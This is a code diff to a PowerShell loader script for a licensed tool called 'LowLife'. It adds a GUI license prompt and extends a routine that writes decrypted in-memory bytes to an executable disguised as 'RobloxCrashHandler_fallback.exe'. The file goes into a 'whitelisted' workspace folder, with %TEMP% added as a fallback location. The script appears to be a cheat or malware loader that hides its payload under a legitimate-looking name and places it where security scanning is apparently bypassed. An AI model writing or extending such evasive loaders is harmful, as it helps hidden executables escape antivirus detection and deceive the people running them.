@@ -103,8 +103,16 @@ if (-not $licenseKey) {
 
 if (-not $licenseKey) {
     if ($Silent) { Write-Error "License key missing in silent mode."; Exit }
-    Write-Host "License key not found in registry or key.txt." -ForegroundColor Yellow
-    $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
+    Write-Host "License key not found in registry or key.txt. Prompting for key..." -ForegroundColor Yellow
+    try {
+        Add-Type -AssemblyName Microsoft.VisualBasic -ErrorAction Stop
+        $prompt = [Microsoft.VisualBasic.Interaction]::InputBox("Enter your LowLife license key:", "LowLife License Verification", "")
+        if ($prompt) {
+            $licenseKey = $prompt.Trim()
+        }
+    } catch {
+        $licenseKey = (Read-Host "Enter your LowLife license key").Trim()
+    }
     if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
 }
 
@@ -515,12 +523,24 @@ Log-Msg "Section 1 complete."
             $fallbackExe = $localServerExe
         } else {
             # Write RAM bytes to a file in the whitelisted workspace as fallback
-            $fallbackExe = Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"
+            $fallbackDir = Join-Path $resolvedPath "build"
+            $fallbackExe = Join-Path $fallbackDir "RobloxCrashHandler_fallback.exe"
             Log-Msg "Writing decrypted bytes to $fallbackExe for execution..."
             try {
+                if (-not (Test-Path $fallbackDir)) {
+                    New-Item -ItemType Directory -Path $fallbackDir -Force | Out-Null
+                }
                 [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
             } catch {
-                Log-Msg "ERROR: Could not write fallback executable: $_"
+                Log-Msg "WARNING: Could not write fallback executable to ${fallbackExe}: $_"
+                $fallbackExe = Join-Path $env:TEMP "RobloxCrashHandler_fallback.exe"
+                Log-Msg "Attempting to write fallback executable to temp directory: $fallbackExe"
+                try {
+                    [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
+                } catch {
+                    Log-Msg "ERROR: Could not write fallback executable to temp: $_"
+                    $fallbackExe = $null
+                }
             }
         }
 
